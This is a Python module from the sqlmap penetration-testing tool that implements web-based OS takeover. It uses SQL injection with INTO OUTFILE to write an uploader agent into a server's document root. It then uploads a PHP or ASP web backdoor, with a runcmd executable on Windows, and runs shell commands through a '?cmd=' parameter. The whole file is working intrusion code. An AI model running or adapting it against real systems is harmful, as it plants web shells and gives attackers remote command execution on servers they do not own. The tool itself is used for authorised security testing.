#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import codecs
import os
import posixpath
import re

from extra.cloak.cloak import decloak
from lib.core.agent import agent
from lib.core.common import decloakToNamedTemporaryFile
from lib.core.common import fileToStr
from lib.core.common import getDirs
from lib.core.common import getDocRoot
from lib.core.common import ntToPosixSlashes
from lib.core.common import isWindowsDriveLetterPath
from lib.core.common import normalizePath
from lib.core.common import posixToNtSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import hexencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapUnsupportedDBMSException
from lib.core.shell import autoCompletion
from lib.request.connect import Connect as Request


class Web:
    """
    This class defines web-oriented OS takeover functionalities for
    plugins.
    """

    def __init__(self):
        self.webApi         = None
        self.webBaseUrl     = None
        self.webBackdoorUrl = None
        self.webUploaderUrl = None
        self.webDirectory   = None

    def webBackdoorRunCmd(self, cmd):
        if self.webBackdoorUrl is None:
            return

        output = None

        if not cmd:
            cmd = conf.osCmd

        cmdUrl  = "%s?cmd=%s" % (self.webBackdoorUrl, cmd)
        page, _ = Request.getPage(url=cmdUrl, direct=True, silent=True)

        if page is not None:
            output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)

            if output:
                output = output.group(1)

        return output

    def webFileUpload(self, fileToUpload, destFileName, directory):
        inputFP = codecs.open(fileToUpload, "rb", conf.dataEncoding)
        retVal = self.__webFileStreamUpload(inputFP, destFileName, directory)
        inputFP.close()

        return retVal

    def __webFileStreamUpload(self, stream, destFileName, directory):
        stream.seek(0) # Rewind

        if self.webApi in ("php", "asp"):
            multipartParams = {
                                "upload":    "1",
                                "file":      stream,
                                "uploadDir": directory,
                              }

            page = Request.getPage(url=self.webUploaderUrl, multipart=multipartParams, raise404=False)

            if "File uploaded" not in page:
                warnMsg  = "unable to upload the backdoor through "
                warnMsg += "the uploader agent on '%s'" % directory
                logger.warn(warnMsg)
                return False
            else:
                return True

        elif self.webApi == "jsp":
            return False

    def __webFileInject(self, fileContent, fileName, directory):
        outFile     = posixpath.normpath("%s/%s" % (directory, fileName))
        uplQuery    = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\') if kb.os == "Windows" else directory)
        query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
        query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
        query       = agent.prefixQuery(" %s" % query)
        query       = agent.postfixQuery(query)
        payload     = agent.payload(newValue=query)
        page        = Request.queryPage(payload)
        return page

    def webInit(self):
        """
        This method is used to write a web backdoor (agent) on a writable
        remote directory within the web server document root.
        """

        if self.webBackdoorUrl is not None and self.webUploaderUrl is not None and self.webApi is not None:
            return

        self.checkDbmsOs()

        infoMsg = "trying to upload the uploader agent"
        logger.info(infoMsg)

        message  = "which web application language does the web server "
        message += "support?\n"
        message += "[1] ASP%s\n" % (" (default)" if kb.os == "Windows" else "")
        message += "[2] PHP%s\n" % ("" if kb.os == "Windows" else " (default)")
        message += "[3] JSP"

        while True:
            choice = readInput(message, default="1" if kb.os == "Windows" else "2")

            if not choice or choice == "2":
                self.webApi = "php"
                break

            elif choice == "1":
                self.webApi = "asp"
                break

            elif choice == "3":
                errMsg  = "JSP web backdoor functionality is not yet "
                errMsg += "implemented"
                raise sqlmapUnsupportedDBMSException(errMsg)

            elif not choice.isdigit():
                logger.warn("invalid value, only digits are allowed")

            elif int(choice) < 1 or int(choice) > 3:
                logger.warn("invalid value, it must be 1 or 3")

        kb.docRoot  = getDocRoot(self.webApi)
        directories = getDirs(self.webApi)
        directories = list(directories)
        directories.sort()

        backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
        backdoorStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi), backdoorName)
        originalBackdoorContent = backdoorContent = backdoorStream.read()

        uploaderName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
        uploaderContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "uploader.%s_" % self.webApi))

        for directory in directories:
            # Upload the uploader agent
            self.__webFileInject(uploaderContent, uploaderName, directory)
            requestDir  = ntToPosixSlashes(directory)

            if requestDir[-1] != '/':
                requestDir += '/'

            requestDir = requestDir.replace(ntToPosixSlashes(kb.docRoot), "/")

            if isWindowsDriveLetterPath(requestDir):
                requestDir = requestDir[2:]

            requestDir = normalizePath(requestDir)

            self.webBaseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
            self.webUploaderUrl = "%s/%s" % (self.webBaseUrl.rstrip('/'), uploaderName)
            self.webUploaderUrl = ntToPosixSlashes(self.webUploaderUrl.replace("./", "/"))
            uplPage, _  = Request.getPage(url=self.webUploaderUrl, direct=True, raise404=False)

            if "sqlmap file uploader" not in uplPage:
                warnMsg  = "unable to upload the uploader "
                warnMsg += "agent on '%s'" % directory
                logger.warn(warnMsg)

                continue

            infoMsg  = "the uploader agent has been successfully uploaded "
            infoMsg += "on '%s' ('%s')" % (directory, self.webUploaderUrl)
            logger.info(infoMsg)

            if self.webApi == "asp":
                runcmdName = "tmpe%s.exe" % randomStr(lowercase=True)
                runcmdStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'), runcmdName)
                match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)

                if match:
                    backdoorDirectory = match.group(1)
                else:
                    continue

                backdoorContent = originalBackdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
                backdoorStream.file.truncate()
                backdoorStream.read()
                backdoorStream.seek(0)
                backdoorStream.write(backdoorContent)

                if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
                    self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
                    self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl.rstrip('/'), backdoorName)
                    self.webDirectory = backdoorDirectory
                else:
                    continue

            else:
                if not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
                    warnMsg  = "backdoor hasn't been successfully uploaded "
                    warnMsg += "with uploader probably because of permission "
                    warnMsg += "issues."
                    logger.warn(warnMsg)

                    message  = "do you want to try the same method used "
                    message += "for uploader? [y/N] "
                    getOutput = readInput(message, default="N")

                    if getOutput in ("y", "Y"):
                        self.__webFileInject(backdoorContent, backdoorName, directory)
                    else:
                        continue

                self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
                self.webDirectory = directory
                    
            infoMsg  = "the backdoor has probably been successfully "
            infoMsg += "uploaded on '%s', go with your browser " % self.webDirectory
            infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
            logger.info(infoMsg)

            break
